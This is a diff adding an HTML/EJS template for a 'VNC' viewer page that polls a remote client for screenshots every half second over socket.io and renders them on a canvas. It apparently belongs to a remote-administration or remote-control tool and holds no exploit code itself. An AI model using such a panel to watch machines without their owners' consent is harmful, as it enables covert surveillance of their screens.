@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" type="text/css" href="/css/vnc.css" />
+    <title><%= clientname %></title>
+  </head>
+  <body>
+    <h1 id="id" data-id="<%= clientid %>"></h1>
+    <div class="view">
+      <!-- <img
+        id="liveCam"
+        src="https://media.tenor.com/UnFx-k_lSckAAAAM/amalie-steiness.gif"
+      /> -->
+      <canvas id="c" width="1000" height="1000"></canvas>
+
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.4.1/socket.io.js"></script>
+
+    <script>
+
+      const socket = io();
+      setInterval(() => {
+        socket.emit("command", {
+          id: document.getElementById("id").getAttribute("data-id"),
+          cmd: "screenshot",
+        });
+      }, 500);
+
+      socket.on("screenshotResult", (msg) => {
+        var c=document.getElementById("c");
+            var ctx=c.getContext("2d");
+            var img=new Image();
+            img.onload = function(){
+                  ctx.drawImage(img,0,0);
+            };
+            img.src = "data:image/jpg;base64," + msg.response;;
+
+        // document.getElementById("liveCam").src =
+        //   "data:image/jpg;base64," + msg.response;
+      });
+    </script>
+  </body>
+</html>
